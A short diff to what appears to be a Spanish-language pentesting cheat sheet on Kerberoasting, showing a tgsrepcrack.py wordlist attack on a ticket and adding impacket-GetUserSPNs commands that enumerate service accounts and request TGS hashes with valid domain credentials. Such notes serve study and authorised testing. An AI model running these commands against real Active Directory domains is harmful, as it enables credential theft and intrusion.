@@ -34,3 +34,18 @@ Kerberoasting es una tecnica de post explotación que permite obtener un hash de
 ❯ python3 tgsrepcrack.py /usr/share/wordlists/rockyou.txt 1-40a1-student@ops~local.kirbi 
 	# TGS ticket File = 1-40a1-student@ops~local.kirbi
 ```
+
+## Impacket-GetUserSPNs
+
+```bash 
+❯ impacket-GetUserSPNs domain.corp/user:Password     # Ver si el usuario es Kerberosteable y lista los usuarios a los que puedes solicitar un TGS
+
+❯ impacket-GetUserSPNs domain1.corp/clearpass.user:Password@1 -dc-ip IP -request
+
+	# dc-ip = Dirección IP del DC
+	# domain1 = Dominio 
+	# clearpass.user = Usuario valido del dominio 
+	# Password@1 = Contraseña del usuario valido 
+
+Nota: Debemos de tener la IP con su dominio en el '/etc/hosts'
+```
